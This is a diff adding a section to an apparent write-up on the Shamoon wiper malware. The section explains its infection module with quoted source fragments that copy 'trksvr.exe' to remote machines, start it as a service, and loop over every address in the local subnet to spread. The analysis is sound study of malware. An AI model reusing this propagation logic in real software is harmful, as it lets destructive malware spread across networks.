@@ -179,6 +179,65 @@ strcpyW(&NewFileName[strlenW(v42)], L"trksvr.exe", 2 * strlenW(L"trksvr.exe") + 
 strcpyW(v39, L"%SystemRoot%\\System32\\", 2 * strlenW(L"%SystemRoot%\\System32\\"));
 DeleteFileW(NewFileName);
 ```
+After assuring "trlsvr.exe" is copied to remote
+```
+{
+		v32 = 2 * strlenW(L"trksvr.exe") + 2;
+		v31 = L"trksvr.exe";
+	}
+	
+	strcpyW(&v39[strlenW(L"%SystemRoot%\\System32\\")], v31, v32);
+```
+the service is started 
+```
+if(Start32bitService(szRemoteAddr, v39))
+		return true;
+```
+
+The second function in this module
+```
+bool Shamoon::Modules::Infection::WriteModuleOnSharedNetwork()
+```
+allows for a spread of the malware across a shared network (as the function name indicates)
+Similar to above, the address of the remote must be obtained, in this case through getting the hostname
+```
+gethostname(szHostname, 50);
+	struct hostent *sHost = gethostbyname(szHostname);
+	
+	DWORD nAddress; // Current address
+	char **szAddrList;
+```
+In which it begins to iterate through the addresses on the host address list
+```
+for(szAddrList = sHost->h_addr_list, nAddress = 0; *szAddrList, nAddress < 10; szAddrList = &sHost->h_addr_list[nAddress++])
+```
+Where it begins to infect all PCs, assuring that it is infecting new ones everytime and iterating based on the last byte of the IP 
+address:
+```
+UINT8 b8CurrentLastIpByte = in.s_impno, b8LastIpByte = 1;
+		do
+		{
+			if(b8CurrentLastIpByte != b8LastIpByte)
+			{
+				in.s_impno = b8LastIpByte;
+				
+				if(strlen(inet_ntoa(in)) <= 19)
+				{
+					btowc(inet_ntoa(in), szPC_IP, strlen(inet_ntoa(in)));
+					WriteModuleOnSharedPC(g_module_path, szPC_IP);
+				}
+			}
+		}
+		while(++b8LastIpByte < 255);
+	}
+```
+where it invokes
+```
+WriteModuleOnSharedPC(g_module_path, szPC_IP);
+```
+on each iteration 
+
+
 ## Wiper.cpp
 
 The wiper file contains the functions
